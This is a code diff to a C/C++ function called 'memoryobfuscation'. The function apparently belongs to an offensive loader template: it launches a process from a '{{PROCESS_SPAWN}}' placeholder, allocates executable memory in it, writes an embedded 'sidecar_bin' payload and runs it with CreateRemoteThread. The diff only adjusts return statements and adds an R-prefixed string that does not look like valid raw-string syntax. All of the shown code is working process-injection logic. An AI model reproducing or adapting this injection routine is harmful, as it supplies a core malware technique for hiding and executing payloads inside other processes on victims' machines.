@@ -38,11 +38,11 @@ void memoryobfuscation(){
     DWORD pid = GetCurrentProcessId();
     HMODULE hModule = GetModuleHandle(NULL);
     if (!hModule) {
-        return NULL;
+        return;
     }
     TextSectionInfo textInfo = GetTextSectionInfo(hModule);
 
-    const char* exeName = "{{PROCESS_SPAWN}}";
+    const char* exeName = R"{{PROCESS_SPAWN}}";
     size_t bufferSize = 256;
     char* result = (char*)malloc(bufferSize);
     sprintf_s(result, bufferSize, "\"%s\" %lu 0x%p 0x%lx", exeName, pid, textInfo.baseAddress, textInfo.size);
@@ -58,7 +58,7 @@ void memoryobfuscation(){
     );
 
     if (!CreateProcessA(
-        "{{PROCESS_SPAWN}}",
+        R"{{PROCESS_SPAWN}}",
         NULL,
         NULL,
         NULL,
@@ -69,21 +69,21 @@ void memoryobfuscation(){
         &si,
         &pi
     )) {
-        return 1;
+        return;
     }
 
     LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMem) {
-        return 1;
+        return;
     }
 
     if (!WriteProcessMemory(pi.hProcess, remoteMem, sidecar_bin, sidecar_bin_len, NULL)) {
-        return 1;
+        return;
     }
 
     HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
     if (!hThread) {
-        return 1;
+        return;
     }
     ConnectNamedPipe(hPipe, NULL);
     DWORD bytesWritten;
